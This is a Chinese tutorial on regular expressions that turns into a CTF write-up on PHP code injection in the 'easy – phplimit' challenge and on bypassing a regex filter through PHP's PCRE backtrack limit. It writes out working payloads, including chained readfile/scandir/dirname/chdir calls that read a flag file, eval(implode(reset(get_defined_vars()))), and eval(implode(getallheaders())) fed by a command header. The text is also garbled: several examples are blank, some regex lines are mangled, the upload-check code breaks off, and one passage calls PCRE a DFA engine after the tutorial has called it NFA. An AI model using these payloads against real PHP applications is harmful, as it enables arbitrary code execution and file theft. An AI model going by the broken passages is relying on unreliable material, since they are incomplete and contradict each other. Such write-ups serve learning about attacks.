## 正则表达式是什么
正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、
将匹配的子串替换或者从某个串中取出符合某个条件的子串等。包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为"元字符"）。
另外正则引擎主要可以分为基本不同的两大类：一种是DFA(确定性有穷自动机），另一种是NFA（非确定性有穷自动机）。
在NFA中由于表达式主导的串行匹配方式，所以用到了回溯（backtracking），这个是NFA最重要的部分，每一次某个分支的匹配失败都会导-致一次回溯。
DFA没有回溯，因此看起来在某些情况下会比NFA来得更快，但是在真正使用中，DFA需要进行预编译才能获得更好效果，
因为DFA的匹配方式需要更多的内存和时间，在第一次遇到正则表达式时需要比NFA详细得多的方法来分析这个表达式，
不过可以预先把对不同正则表达式的分析结果建好，DFA就可以获得比NFA更优的速度。
虽然NFA速度更慢，并且实现复杂，但是它又有着比DFA强大的多的功能，比如支持环视，支持反向引用（虽然这个是非正则的）等，
因此大多数程序语言都使用了NFA作为正则引擎，其中也包括PHP使用的PCRE库。
### 0x02 扩展表示法
扩展表示是以问号开始（?…）,通常用于在判断匹配之前提供标记，实现一个前视（或者后视）匹配，或者条件检查。
尽管圆括号使用这些符号，但是只有（?P）表述一个分组匹配。
    正则表达式 | 匹配字符串
    -----------| ---------    (?:\w+\.)* | 以句点作为结尾的字符串，例如“google.”、“twitter.”、“facebook.”，但是这些匹配不会保存下来供后续的使用和数据检索
    (?=.com)   | 如果一个字符串后面跟着“.com”才做匹配操作，并不使用任何目标字符串
    (?!.net)   |如果一个字符串后面不是跟着“.net”才做匹配操作
    (?[^()]+)\|(?R))* \) | 进行循环匹配
## 循环匹配探索
在上述的扩展表达式中有一个循环模式， 特殊项(?R)提供了递归的这种特殊用法，在PRCE模式中，考虑匹配圆括号内字符串的问题，
允许无限嵌套括号。如果不使用递归， 最好的方式是使用一个模式匹配固定深度的嵌套。
这个PCRE模式解决了圆括号问题(假设 PCRE_EXTENDED 选项被设置了， 因此空白字符被忽略)：`\( ( (?>[^()]+) | (?R)
)* \)。`
**IN:**
**OUT:**
    int(1) string(0) "" string(3) "abc"
从以上的输出结果，可以明显的发现，`'/\((?R)*\)/'`这个正则表达式，进行自身循环匹配。
### 从一道ctf题浅析利用
题目的名字为[easy – phplimit](http://51.158.75.42:8084/)，是p神出的一个练习代码审计的题目。源码如下：
自搭建环境测试
    getcwd(): 获取当前路径
    IN:
    ?code=print_r(getcwd());
    OUT:
    A:\tools\phpStudy\WWW\study
    dirname(): 返回路径中的目录部分
    IN:
    ?code=print_r(dirname(getcwd()));
    OUT:
    A:\tools\phpStudy\WWW
这里对dirname($path)进行一个解释：该函数的返回值为，返回path的父目录。如果在 path中没有斜线，则返回一个点('.')，
表示当前目录，因此此处为父目录`'A:\tools\phpStudy\WWW'`，后面使用chdir时是当前目录。
    chdir(): 改变工作目录
    IN:
    ?code=print_r(chdir(getcwd()));
    OUT:
    1
    成功返回1(true)
    get_defined_vars(): 返回由所有已定义变量所组成的数组
    IN:
    ?test=1&code=print_r(get_defined_vars());
    OUT:
    Array([_GET] => Array ( [test] => 1 [code] => print_r(get_defined_vars()); ) [_POST] => Array ( ) [_COOKIE] => Array() ) [_FILES] => Array ( ) [a] => Array()....
**探测到目录与文件情况后就可以进行构造payload**
    =>获得路径为/var/html
    ?code = print_r(getcwd());
    =>查看路径下内容没有可用的
    ?code = print_r(scandir(getcwd()))
    =>探测上一级为Array ( [0] => . [1] => .. [2] => flag_phpbyp4ss [3] => html )
    ?code = print_r(scandir(dirname(getcwd())))
    =>发现flag文件，进行读取
    ?code = readfile(next(array_reverse(scandir(dirname(getcwd())))))
    =>发现报错，不存在flag_phpbyp4ss文件，更改工作目录
    ?code = readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))))
会发现最后的payload多了一个dirname()，原因是因为dirname()中的path没有斜线就会返回本路径，不会影响最后结果。
另外在RCTF中，r-cursive中也用到了这个知识点，官方的解使用eval(implode(getallheaders()))，执行返回的HHTP头内的信息，更改头部信息加上cmd:
phpinfo();// 达到命令执行。
但是该题目中却不可以，由于环境不同apache模块的函数不能在ngnix中执行，参照大佬们的思路，利用get_defined_vars()执行GET的参数
**payload为：**
    ?1=readfile(../flag_phpbyp4ss);&code=eval(implode(reset(get_defined_vars())));
### php回溯机制
前面我们已经说到了PHP使用PCRE库，那幺正则引擎就是DFA(确定性有穷自动机），使用回溯的方式进行匹配，
大致过程就是在对一个字符串进行匹配时，如果匹配失败吐出一个字符，然后再进行匹配，如果依然失败，重复上面操作.....
**举一个例子，更详细的阐述：**
    ].*/',' ] => ] => ] => ] => ] => ] => ] => ].* => ].*没有完成匹配，
因此就向前匹配，知道匹配成功（到phpinfo()后面的;）。
### 使用php的pcre.backtrack_limit限制绕过
当然在上面那个匹配中不可能一直回溯，那这样就会消耗服务器资源，就形成了正则表达式的拒绝服务攻击，因此php就有了限制回溯的机制
**IN:**  
]._/is', '].*/is', $data);
    }
    if(empty($_FILES)) {
    die(show_source(__FILE__));
    }
    $user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);
    $data = file_get_contents($_FILES['file']['tmp_name']);
    if (is_php($data)) {
    echo "bad request";
    } else {
    @mkdir($user_dir, 0755);
    $path = $user_dir . '/' . random_int(0, 10) . '.php';